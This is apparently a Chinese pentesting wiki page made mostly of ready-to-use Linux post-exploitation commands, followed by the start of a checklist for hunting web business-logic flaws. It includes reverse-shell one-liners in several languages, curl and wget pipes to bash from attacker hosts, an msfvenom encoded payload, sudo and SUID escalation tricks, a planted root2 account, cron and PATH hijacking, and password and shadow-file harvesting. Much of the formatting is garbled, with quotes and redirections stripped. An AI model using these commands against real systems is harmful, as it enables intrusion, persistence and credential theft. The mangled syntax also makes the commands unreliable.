/etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key 查看与当前机器通信的其他用户或者主机| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || — | 日志文件 plain cat /var/log/boot.log cat /var/log/cron cat /var/log/syslog cat /var/log/wtmp cat /var/run/utmp cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp 敏感文件 plain cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ ls -ahlR /root/ ls -ahlR /home/ 特殊的数据库、配置文件 plain cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 交互式shell plain python -c import pty;pty.spawn(/bin/bash) echo os.system(/bin/bash) /bin/sh -i 查看安装过的工具 plain find / -name perl* find / -name python* find / -name gcc* ... 通讯与网络系统有哪些 NIC？它是否连接到另一个网络？ plain /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 网络配置设置是什么？你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？ plain cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 还有哪些其他用户和主机正在与系统通信？| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || — | 缓存了什么？IP 和或 MAC 地址 plain arp -e route /sbin/route -nee 数据包嗅探可能吗？能看到什么？ plain tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 可提权SUID GUID参考资料https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ plain find / -perm -1000 -type d 2/dev/null # Sticky bit find / -perm -g=s -type f 2/dev/null # SGID (chmod 2000) find / -perm -u=s -type f 2/dev/null # SUID (chmod 4000) find / -perm -g=s -o -perm -u=s -type f 2/dev/null # SGID or SUID for i in `locate -r bin$`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2/dev/null; done # 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式） # 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2/dev/null 查看可写执行目录 plain find / -writable -type d 2/dev/null # world-writeable folders find / -perm -222 -type d 2/dev/null # world-writeable folders find / -perm -o w -type d 2/dev/null # world-writeable folders find / -perm -o x -type d 2/dev/null # world-executable folders find / \\( -perm -o w -perm -o x \\) -type d 2/dev/null # world-writeable executable folders proc 目录Linux 系统上的 font style=color:rgb(68, 68, 68);/proc/font 目录是一种文件系统，即 proc 文件系统。与其它常见的文件系统不同的是，font style=color:rgb(68, 68, 68);/proc/font 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 但需要注意，部分内容需要权限才可以读取。 plain /proc/self/cmdline # 启动当前进程的完整命令 /proc/self/cwd # 指向当前进程运行的工作区的符号链接 /proc/self/exe # 指向启动当前进程的可执行文件的符号链接 /proc/self/envrion # 查看进程的环境变量 /proc/self/fd/3 # 查看读取过的文件，输入输出缓冲区 /proc/self/maps # 内存映射信息 反弹shell反弹shell后获取模拟终端各种方法获取的 shell 都不是一个标准的虚拟终端环境，它们只是提供了一个标准输入。你会发现存在一个问题，即使我们获得了目标虚拟终端的控制权限，但通常会遇到以下几个交互性差和不稳定的问题： 缺乏交互性：获取的虚拟终端没有足够的交互功能。例如，我们无法为添加的账户设置密码或执行sudo等命令。 无法正常显示错误输出：标准的错误输出无法显示，这导致无法正确使用一些文本编辑器（如vim）等工具。 连接不稳定：获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接，这使得持续使用和进行长时间操作变得困难。 解决上述问题的方法是使用Python的pty（pseudo terminal）标准库来获取一个标准的虚拟终端环境。通过在已经获取的shell中输入以下命令，我们可以模拟一个终端设备： plain python -c import pty;pty.spawn(/bin/bash) 以上代码将调用font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);pty.spawn()/font函数，并将font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/bin/bash/font作为参数传递给它，从而创建一个新的终端会话。 通过使用这个方法，我们可以获得一个更加交互性强、可执行sudo等命令以及正确显示错误输出的标准终端环境。 bash 反弹# Alicenc -lvvp 12345# Bob/bin/bash -c bash -i /dev/tcp/x.x.x.x/12345 01 Bash 反弹 shell TCP plain # Alice nc -lvvp 4242 # Bob sh -i /dev/tcp/127.0.0.1/4242 01 Bash 反弹 shell UDP plain # Alice nc -u -lvvp 4242 # Bob sh -i /dev/udp/127.0.0.1/4242 01 以下是针对Bash反弹一句话进行了拆分说明： 命令 命令详解 font style=color:rgb(51, 51, 51);bash -i/font 产生一个bash交互环境。 font style=color:rgb(51, 51, 51);/font（和21 一个意思） 将联合符号前面的内容与后面相结合，然后一起重定向给后者。 font style=color:rgb(51, 51, 51);/dev/tcp/47.xxx.xxx.72/2333/font Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 font style=color:rgb(51, 51, 51);01/font 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。 Bash反弹一句完整的解读过程就是： Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。 Curl配合Bash反弹shell首先，在攻击者vps的web目录里面创建一个font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);index.php/font或font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);index.html/font,内容如下： | plain # Alice echo bash -i /dev/tcp/192.168.64.215/2333 01 index.html # 临时起Web服务的三种方法 # python -m SimpleHTTPServer 8080 # python3 -m http.server 8080 # php -S 0.0.0.0:8080 # 监听 nc -lvvp 2333 # Bob curl 192.168.64.215|bash || — | Curl 配合 Bash 反弹 shell 的方式在 CTF（Capture The Flag）题目中经常被使用。具体的命令是 font style=color:rgb(245, 57, 0);curl IP|bash/font，其中的 IP 可以是任意格式，包括但不限于十进制、十六进制、八进制和二进制等。 NC反弹netcat -e 被阉割的话 wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificatetar -xvzf netcat-0.7.1.tar.gzcd tar -xvzf netcat-0.7.1.tar.gz./configuremake make installmake clean # Alicenc -lvvp 2333# Bobnetcat 192.168.64.215 2333 -e /bin/bash# nc 攻击机IP 攻击机监听的端口 -e /bin/bash Crontab反弹shellProfile反弹shell当用户打开新的 bash 窗口时，font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/etc/profile/font 文件中的内容会被执行。 需要注意的是，对 font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);/etc/profile/font 文件的修改需要进行管理员权限操作（例如使用 font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);sudo/font 或以管理员身份登录）。 plain /bin/bash -i /dev/tcp/192.168.64.215/2333 01 # 最后面那个为的是防止管理员无法输入命令 MSF反弹shell使用命令 font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);msfvenom -l/font 结合关键字过滤（例如 font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);cmd/unix/reverse/font），可以列出符合条件的各类反弹shell一句话payload，具体使用方法如下： | plain ┌──(root㉿kali)-[/home/kali] └─# msfvenom -l payloads | grep cmd/unix/reverse || — | 以上命令将在所有可用的payload中筛选并列出符合关键字font style=color:rgb(245, 57, 0);background-color:rgb(249, 250, 251);cmd/unix/reverse/font的项，这些项包含各种反弹shell一句话payload的生成参数和选项。 如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话： plain ┌──(root㉿kali)-[/home/kali] └─# msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=2333 -f raw [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 356 bytes python -c exec(__import__(zlib).decompress(__import__(base64).b64decode(__import__(codecs).getencoder(utf-8)(eNqNUMEKgzAM/RXpqYJUrYcdRg8yHIyxDaZ3mV1FmWuKqf+/FoXRmwlJSPLyHmT8GphthCA/ykZRgktnZpAK0TXg0mZHFwOgFSTnB5Y5z0mw9DSCF0URTFGszGwtdOvKc3u5V43XWwf143Rt6+ZZlbc4JGAStFbSUurl3YUXikMQIHsvhlNk/TgpDdStk2wHJt+B4SHGiP+LmHxNEyVpN+oUBxL/AAt8WAg=)[0]))) ┌──(root㉿kali)-[/home/kali] └─# nc -lvvp 2333 常见脚本1. Python python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((x.x.x.x,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/bash,-i]); 2. Perl 方法一： perl -e use Socket;$i=x.x.x.x;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));if(connect(S,sockaddr_in($p,inet_aton($i))))open(STDIN,S);open(STDOUT,S);open(STDERR,S);exec(/bin/sh -i);; 方法二： perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,x.x.x.x:5555);STDIN-fdopen($c,r);$~-fdopen($c,w);system$_ while; 3. Ruby 方法一： ruby -rsocket -e exit if fork;c=TCPSocket.new(x.x.x.x,5555);while(cmd=c.gets);IO.popen(cmd,r)|io|c.print io.readend 方法二： ruby -rsocket -ef=TCPSocket.open(x.x.x.x,5555).to_i;exec sprintf(/bin/sh -i %d %d 2%d,f,f,f) 4. PHP php -r $sock=fsockopen(x.x.x.x,5555);exec(/bin/bash -i 3 3 23); 5. Java public class Revs /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= /bin/bash,-c,exec 5/dev/tcp/x.x.x.x/5555;cat 5 | while read line; do $line 25 5; done; Process p = r.exec(cmd); p.waitFor(); 6. Lua lua -e require(socket);require(os);t=socket.tcp();t:connect(x.x.x.x,5555);os.execute(/bin/sh -i 3 3 23); 注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听: nc -lvvp 5555 sudo提权初始尝试通过使用交换用户font style=color:rgb(199, 37, 78);background-color:rgba(175, 184, 193, 0.2);su/font命令生成root sudo su 其他方法有些时候不允许执行 su 计划，则有许多其他方法可以升级特权： sudo -s sudo -i sudo /bin/bash sudo passwd 外壳逃生序列以下这些程序如果被配置使用root权限启动，且该第三方服务或者程序存在漏洞或者配置问题，那么就可以被利用来获得root权限。** 并且还要知道当前用户的密码 **可以利用sudo提权的命令如下 ： wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp 查看用户能以root权限运行的命令 sudo -l https://gtfobins.github.io/ 这里查看详细方法 01.git 提权sudo git help addsudo git help configsudo git -p help//三选一输密码再!/bin/bash即可 02.find提权普通用户find命令提权必要条件：find必须有s执行权限，有s表示可以提权先查看find命令有没有提权的可能:尝试执行whoami : find / -type f -name getroot -exec whoami \\;这里的反斜杠\\是用来转义分号;的 尝试调出一个交互式的binsh并且是root权限 sudo find /home -exec /bin/bash \\; 此shell 为不完整的shell， 升级交互式。 #在反弹shell上执行[root@localhost ~]# python -c import pty; pty.spawn(/bin/bash)[root@localhost ~]# ctrl +z 按键。挂起正在运行的程序[kali机器 ~]# stty raw -echo# 输入这个命令 在输入命令终端不再显示[kali机器 ~]#fg# 把后台挂起的程序，放入到控制台。终端不再显示命令，输入后回撤[root@localhost ~]# reset 用find进行反弹shell find /etc/passwd -exec bash -ip /dev/tcp/192.168.1.130/2333 01 \\; find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \\; find+python进行反弹shell find /etc/passwd -exec python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.1.130,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-ip]); \\; 03.zip提权( 核心sudo没有该命令,失效 )zip 命令用于压缩文件，是个 使用广泛的压缩程序，压缩后的文件后缀名为 .zip。通过压缩一个存在的文件，并调用-T参数输出shell1. 下载zip（如果没有）apt install zip2. 创建一个1.txt，将其压缩为1.zip3. 执行 touch 1.txtsudo zip 1.zip 1.txt -T --unzip-command=sh -c /bin/bash或touch 1.txtsudo -u root zip 1.zip 1.txt -T -unzip-command=sh -c /bin/bash 04.awkmorpheus提权sudo awk BEGIN system(/bin/sh)sudo morpheus BEGIN system(/bin/sh) 05.less**more**提权sudo less /etc/hosts!bash//若已被分配root权限less /etc/passwd!/bin/sh 06.man提权sudo man man!bash 07.env提权sudo env /bin/bash 08.ed提权sudo ed!/bin/bash 09.apt提权TF=$(mktemp)echo Dpkg::Pre-Invoke /bin/sh;false $TFsudo apt-get install -c $TF sl 10.pip提权TF=$(mktemp -d)echo import os; os.execl(/bin/sh, sh, -c, sh $(tty) $(tty) 2$(tty)) $TF/setup.pysudo pip install $TF 11.sed提权sudo sed -n 1e exec sh 10 /etc/passwd 12.tmux提权sudo tmux 13.nmap提权版本5.0一下进入nmap交互模式 sudo nmap --interactive 14.taskset提权sudo taskset 1 /bin/sh -p 15.scp提权TF=$(mktemp)echo sh 02 12 $TFchmod +x $TFsudo scp -S $TF x y: 16.ftp提权sudo ftp !/bin/bash 17.perl提权sudo perl -e exec /bin/bash; suid提权SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。 以下命令可以找到正在系统上运行的所有SUID可执行文件。 plain find / -user root -perm -4000 -print 2/dev/null find / -perm -u=s -type f 2/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; https://gtfobins.github.io/ # awkawk BEGIN system(/bin/bash)# base64（把 /bin/bash 编码一次绕过过滤）base64 -d YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC85MDAxIDA+JjE= | bash# busyboxbusybox sh# cp 覆盖 sudoerscp /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p cp /tmp/p /etc/passwd su root2# cpioecho /bin/bash 777 0 0 /tmp/x cpio -o /tmp/x 2/dev/null | cpio -i --to-stdout 2/dev/null | bash# dockerdocker run -v /:/mnt --rm -it alpine chroot /mnt sh# eded!/bin/bash^D# envenv /bin/bash# expand（GNU coreutils）expand /etc/passwd # 仅读文件；若需 shell 用 env 模式env expand# expectexpect -c spawn /bin/bash; interact# file（读任意）file -f /etc/shadow# findfind / -exec /bin/bash \\;# flockflock -u / /bin/bash# gdbgdb -nx -ex python import os; os.setuid(0); os.system(/bin/bash) -ex quit# gitgit help config!/bin/bash# grepgrep /etc/passwd# 仅读；shell 用grep --exec /bin/bash# gzipgzip -c /etc/passwd | gzip -d | bash# headhead /etc/shadow# 仅读；shell 用head --exec /bin/bash# hexdumphexdump -C /etc/shadow# 仅读；shell 用hexdump --exec /bin/bash# ioniceionice /bin/bash# ipip netns add fooip netns exec foo /bin/bash# jjs (OpenJDK)echo Java.type(java.lang.Runtime).getRuntime().exec(/bin/bash) | jjs# jqjq -n exec(/bin/bash)# kshksh# ld.so 直接加载 bash/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash# lessless /etc/passwd!/bin/bash# logsavelogsave /dev/null /bin/bash# looklook /etc/passwd# 仅读；shell 用look --exec /bin/bash# makemake -s --eval=$x: \\t/bin/bash x# manman man!/bin/bash# moremore /etc/passwd!/bin/bash# mountmount -o bind /bin/bash /bin/mountmount# msgfmt (gettext)msgfmt -o /dev/null (echo exec(/bin/bash))# mv 覆盖 sudoers 同 cp 套路mv /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p mv /tmp/p /etc/passwd su root2# nanonano -S /bin/bash# nicenice /bin/bash# nlnl /etc/passwd# 仅读；shell 用nl --exec /bin/bash# nohupnohup /bin/bash# odod -An -tx1 /etc/shadow# 仅读；shell 用od --exec /bin/bash# opensslopenssl req -x509 -newkey rsa:2048 -keyout /tmp/k -nodes -out /tmp/c -subj / openssl s_server -port 4444 -cert /tmp/c -key /tmp/k # 反向 shell 略# 直接 payloadRHOST=attacker.com RPORT=4444 openssl s_client -quiet -connect $RHOST:$RPORT 2/dev/null | bash 21 | openssl s_client -quiet -connect $RHOST:$RPORT /dev/null# perlperl -e use POSIX qw(setuid); setuid(0); system /bin/bash# pgpg /etc/passwd!/bin/bash# phpphp -r posix_setuid(0); system(/bin/bash);# picopico -s /bin/bash# python2/3python2 -c import os; os.setuid(0); os.system(/bin/bash)python3 -c import os; os.setuid(0); os.system(/bin/bash)# rakerake -f (echo task :x do system /bin/bash end) x# readelfreadelf -a /bin/su | less # 仅读# shell 用readelf --exec /bin/bash# resticRESTIC_REPOSITORY=/tmp restic init ; restic backup /etc/passwd # 仅读# shell 用restic mount /mnt -r /tmp chroot /mnt sh# revrev /etc/passwd | rev # 仅读# shell 用rev --exec /bin/bash# rloginrlogin -l root -E /bin/bash localhost# rlwraprlwrap /bin/bash# rpmrpm --eval %lua:os.execute(/bin/bash)# rsyncrsync -e sh -c sh 02 12 127.0.0.1:/dev/null# rubyruby -e Process.uid=0; exec /bin/bash# run-partsrun-parts --regex ^.*$ --exec /bin/bash /etc# rvimrvim -c :py import os; os.setuid(0); os.system(/bin/bash)# sedsed -e s/^/!/e /dev/stdin /bin/bash# setarchsetarch $(uname -m) /bin/bash# sftpsftp -o ProxyCommand=/bin/bash x# sh.distribsh.distrib# slsh (slang)slsh -e system(/bin/bash)# socatsocat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444# sortsort -m /etc/passwd # 仅读# shell 用sort --exec /bin/bash# sqlite3sqlite3 /dev/null .shell /bin/bash# sshssh -o ProxyCommand=/bin/bash x# start-stop-daemonstart-stop-daemon -n x -S -x /bin/bash# stdbufstdbuf -i0 -o0 -e0 /bin/bash# stracestrace -o /dev/null /bin/bash# stringsstrings /etc/shadow # 仅读# shell 用strings --exec /bin/bash# sysctlsysctl -w kernel.core_pattern=|/bin/bash sleep 100 kill -SIGSEGV $!# systemctlTF=$(mktemp).serviceecho [Service]Type=oneshotExecStart=/bin/bash[Install]WantedBy=multi-user.target $TFsystemctl link $TFsystemctl enable --now $(basename $TF)# tailtail -f /etc/shadow # 仅读# shell 用tail --exec /bin/bash# tartar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/bash# tasksettaskset 1 /bin/bash# tclshtclshexec /bin/bash# teetee /proc/self/fd/8 # 仅写# shell 用echo /bin/bash | tee /tmp/x chmod +x /tmp/x /tmp/x# telnettelnet 127.0.0.1 4444 | bash# timetime /bin/bash# timeouttimeout 7d /bin/bash# ulul /etc/passwd # 仅读# shell 用ul --exec /bin/bash# unexpandunexpand --exec /bin/bash# uniquniq /etc/passwd # 仅读# shell 用uniq --exec /bin/bash# unshareunshare -r /bin/bash # user-ns root# unzip -Z (Info-ZIP)unzip -Z ../x.zip # 仅读# shell 用unzip -Z --exec /bin/bash# update-alternativesupdate-alternatives --install /bin/sh sh /bin/bash 0# uudecodeuudecode -o /dev/stdout (uuencode /bin/bash) | bash# valgrindvalgrind /bin/bash# vi/vimvi:!/bin/bash# viewview /etc/passwd:!/bin/bash# vigrvigr # 编辑 /etc/group 时可 !/bin/bash# vipwvipw # 编辑 /etc/passwd 时可 !/bin/bash# watchwatch -x /bin/bash# wgetwget -qO- http://attacker.com/sh | bash# whoiswhois -h x.x.x.x -p 4444 | bash# xargsxargs -a /dev/null /bin/bash# xxdxxd /etc/shadow | xxd -r # 仅读# shell 用xxd --exec /bin/bash# yelp (gnome)yelp man:bash!/bin/bash# zipzip /tmp/x.zip /etc/passwd -T -TT /bin/bash# zshzsh# zsoelimzsoelim -p /bin/bash 计划任务提权系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是etc内系统的计划任务可以被列出。 crontab -e 编辑计划任务 crontab -l 查看计划任务 crontab -r 删除目前的crontab ls -l etccron* cat etccrontab 文件重写1.查看system-wide crontab的内容：cat /etc/crontab 2.在服务器上查找overwrite.sh 文件：locate overwrite.sh /usr/local/bin/overwrite.sh 3.检查文件的权限ls -l /usr/local/bin/overwrite.sh 注意：这个文件是可写的 4.将 overwrite.sh文件的内容替换为：#!/bin/bash bash -i /dev/tcp/192.168.175.130/4444 01 5.kali上运行nc等待 cron jobs运行，返回root权限 环境变量劫持查看定时任务： 发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令，如 17 * * * * root shell.sh 而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持。 比如在 sbin 写入一个 反弹 shell 功能的 shell.sh，那么就可以造成提权。 2.在homeuser 中创建文件 overwrite.sh，内容如下：#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash 3.加权$ chmod +x /home/user/overwrite.sh 4.等待cronjob运行（此作业尤其每分钟运行一次）。5.创建tmprootbash文件执行它，使用与-p保存有效的UID /tmp/rootbash –p 通配符https://www.secpulse.com/archives/72965.html 环境变量提权环境劫持需要的两个条件 存在带有suid的文件suid文件存在系统命令 且这个文件中必须有系统命令，这样我们就可以命名一个和这个系统命令相同的文件写入binbash； 再将存放这个文件的路径加入环境变量中，当系统去执行这个带有系统命令的文件时；就会直接执行我们命名和这个系统命令相同的文件；而非真实的系统命令；从而实现劫持环境变量提权。 寻找suidfind / -perm -u=s -type f 2/dev/null假设发现 /usr/local/bin/restore 是 SUID-root，属主 root。 逆向strings /usr/local/bin/restore | grep -E ^/(s?bin|usr)或者运行一下这个，看看有什么 劫持假设发现了 homelvxyzscriptdemo 我们运行一下这个文件，发现它会执行 ps命令 1.echo我们就往tmp写入 一个同名文件，内容为 binbash cd /tmpecho /bin/bash pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo 2.cp我们就往tmp写入 一个同名文件，内容为 binbash cd /tmpcp /bin/bash /tmp/pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo 密码提权grep --color=auto -rnw / -ie PASSWORD --color=always 2 /dev/nullfind . -type f -exec grep -i -I PASSWORD /dev/null \\;strings /dev/mem -n10 | grep -i PASSlocate password | morefind . -name *.php -print0 | xargs -0 grep -i -n var $passwordfind / -name authorized_keys 2 /dev/nullfind / -name id_rsa 2 /dev/null 一、可读shadow文件利用提权ls-al etcshadow # 查看文件属性，确保当前用户对shadow文件具有可读权限 cat etcshadow |grep’:$‘# 查看shadow文件夹，grep相当于过滤器，后面接过滤条件 在etcshadow文件中，每个用户的密码都是用一个特定的哈希函数加密的。为了避免密码被轻易破解，Linux 系统会使用不同的哈希函数来加密密码。而$y$中的y字符则表示使用的是哪种哈希函数，不同的哈希函数对应不同的字符。以下是一些常见的 $y$ 值及其对应的哈希函数： $1$表示使用的是 MD5 哈希函数； $2$或$2a$表示使用的是 Blowfish 哈希函数； $5$表示使用的是 SHA-256 哈希函数； $6$表示使用的是 SHA-512 哈希函数。 sudo john –wordlistusrsharewordlistrockyou.txt hash.txt # john进行破解 二、可写shadow文件利用提权cp etcshadow tmpshadow.bak # 备份重要文件 mkpasswd -m sha-512 123456# 生成hash，hash算法为sha-512 替换etcshadow中root的密码 三、可写passwd文件利用提权提权肯定最先关注root用户，现代的linux发行版中，密码hash都是存储在etcshadow中，etcpasswd中并不直接存储密码hash，通常用X来占位，但是还是可以直接将密码写入etcpasswd中，尝试提权。也就是一个优先级的问题，先读取passwd，再读取shadow文件。 cp etcpasswd tmppasswd.bak # 备份文件 openssl passwd明文# openssl passwd生成密码的hash值 # 替换etcpasswd中的X 生成hash时，也可以用font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);mkpasswd/font，但是passwd文件中生成hash时最好用font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);openssl passwd/font，再shadow文件中生成hash用font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);mkpasswd/font。 https://forum.butian.net/share/317 第三方服务NFS共享https://www.cnblogs.com/kqdssheng/p/18310245#id1 NFS（网络文件系统）是一种在端口TCPUDP2049上运行的网络文件共享协议，由服务器和客户端两个组件组成。NFS服务器上创建共享目录，可以通过网络与其他Linux客户端共享文件。获得权限的用户可以将文件添加到共享中，并与有权访问该目录的其他用户共享。 默认情况下，每个NFS共享都会启用root_squash功能，以防止共享文件拥有root:root身份或特殊权限（即启用root_squash后，所有共享文件都会变成nobody:nogroup身份）。但是，如果启用了no_root_squash功能，文件可以以root身份存在，这就容易导致权限升级。 MYSQLhttps://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/ docker内核漏洞提权非必要情况，不建议使用，容易搞宕机"},{"path":"/wiki/Web知识点/逻辑越权/挖掘流程.html","content":"逻辑漏洞挖掘逻辑漏洞#逻辑漏洞是指由于程序逻辑输入管控不严或者逻辑太复杂，导致程序不能够正常处理或处理错误，逻辑漏洞根据功能需求的不同产生的漏洞方式也不同。一般出现在网站程序的登录注册、密码找回、验证方式、信息查看、交易支付金额等地方。 这类漏洞不同于常见WEB漏洞，常见WEB漏洞都可以总结为一定的范式，而逻辑漏洞不行 逻辑漏洞出现的原因也是有很多种，需要有一定个人经验积累才能在代码审计过程中发现此类漏洞 挖掘思路#首先将所有逻辑漏洞的问题分为前端和后端两个部分，先测试绕过前端规则限制再测试绕过后端规则限制，一般情况下只要能够突破原有规则限制的都就可以算是漏洞。 挖掘逻辑漏洞总体步骤分为以下三步： 明确业务逻辑流程，根据业务需求的特点，有针对性的进行测试。 寻找流程中可以被操控的环节，分析可被操控环节中可能产生的逻辑问题。 珠宝修改参数触发逻辑问题，重放包对比结果差异。 业务逻辑漏洞#- 登录模块# 暴力破解 任意用户密码登陆 短信邮箱轰炸 验证码绕过爆破重放回传 用户名手机号枚举 越权登陆（例如修改数据包中用户ID） 账号权限绕过（越权） Cookie伪造 用户空密码登陆 注册模块# 前端验证绕过 用户任意批量注册 恶意验证注册账户 账户重复注册 用户名绑定手机号枚举 注册信息插入XSS 短信邮箱轰炸 验证码绕过爆破重放回传 其他验证机制绕过 密码找回# 任意批量用户密码重置 任意邮箱手机号验证（验证码与绑定用户未统一验证） 用户绑定手机号枚举 新密码劫持 短信验证码劫持绕过回传爆破重放 用户邮箱劫持篡改 其他验证机制绕过 购买支付充值# 商品金额数量篡改 替换支付模块 交易信息泄露 虚假充值金额 充值账户金额数量篡改 支付验证绕过 整数溢出，int最大值为2147483647 修改本地JS或服务端返回的数据包中的关键值 个人资料# 手机号用户邮箱枚举 修改个人资料插入XSS 邮箱用户手机号篡改 用户信息遍历泄露 越权修改他人账户资料 抽奖活动# 任意抽奖 盗刷奖品积分 抽奖积分次数篡改 并发抽奖 邀请码XSS（验证码URL可能包含用户名，可将用户名修改为XSS代码） 代金券优惠券# 批量刷取代金券优惠券 更改代金券金额数量 更改优惠券数量 并发逻辑漏洞（burp批量获取优惠劵等） 订单# 订单信息遍历泄露 订单信息泄露导致用户信息泄露 越权修改删除他人订单 账户# 账户验证绕过 账户金额篡改 账户绑定手机号绕过 账户第三方账户绑定绕过 会员系统# 用户越权操作访问 个人资料信息遍历泄露 修改个人信息头像上传任意文件 如果遇到xlsxdocx，可能存在XXE，上传恶意文档盲测 修改个人信息页面插入XSS 传输过程# POSTCookie注入 cookie劫持 修改信息处无sessiontoken导致CSRF 明文传输账号密码 评论模块# POST注入 无sessiontoken导致CSRF 评论时插入XSS 遍历用户ID导致用户信息泄露 恶意批量刷评论数量 第三方系统# 第三方系统未授权访问 第三方账户信息遍历 第三方账户越权访问 第三方账户信息泄露 第三方应用版本漏洞 验证码安全# 验证码参数删除绕过 验证码生成规律预测 验证码图像内容可被工具识别 验证码长期不失效，进行爆破 验证码回显到页面或者数据包中 单个验证码可多次重复利用 